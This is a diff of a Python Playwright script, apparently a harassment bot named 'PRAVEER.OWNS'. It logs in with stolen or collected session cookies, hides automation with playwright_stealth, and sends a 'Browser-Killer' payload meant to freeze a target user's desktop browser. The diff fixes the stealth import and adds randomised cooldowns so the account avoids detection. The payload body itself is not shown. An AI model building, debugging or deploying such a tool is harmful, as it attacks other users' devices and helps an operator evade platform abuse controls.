@@ -1,11 +1,11 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (LONE-WOLF FINAL)
-# 📅 STATUS: 1-ID-STABILITY | DESKTOP-FREEZE | FIXED-IMPORT
+# 🚀 PROJECT: PRAVEER.OWNS (LONE-WOLF FINAL-FIX)
+# 📅 STATUS: IMPORT-FIXED | DESKTOP-FREEZE | 1-ID-STABLE
 
 import os, asyncio, random, sys
 from playwright.async_api import async_playwright
-# --- THE ABSOLUTE IMPORT FIX ---
-import playwright_stealth
+# --- THE FIX: Import the function specifically from the module ---
+from playwright_stealth import stealth 
 
 def get_kernel_stop_payload(target_name):
     """Targets Desktop Browser Layout Engines."""
@@ -36,8 +36,8 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
         )
         page = await context.new_page()
         
-        # ✅ THE CALL: Accessing the function directly from the module
-        await playwright_stealth.stealth(page)
+        # ✅ THE CALL: Now it calls the function, not the module
+        await stealth(page)
         
         try:
             print(f"📡 [M{machine_id}] Establishing Stealth Connection...")
@@ -62,11 +62,11 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
                 await asyncio.sleep(random.uniform(3, 5)) 
                 await page.keyboard.press("Enter")
                 
-                print(f"💀 [M{machine_id}] Browser-Killer Delivered.")
+                print(f"💀 [M{machine_id}] Browser-Killer Delivered. UI Thread Saturation: MAX.")
 
                 # ⏳ THE 'SAFETY GAP' (120-150 seconds)
                 sleep_time = random.uniform(120, 150)
-                print(f"⏳ Cooling down for {int(sleep_time)}s...")
+                print(f"⏳ Cooling down for {int(sleep_time)}s to keep 1-ID safe...")
                 
                 for _ in range(4):
                     await asyncio.sleep(sleep_time / 4)
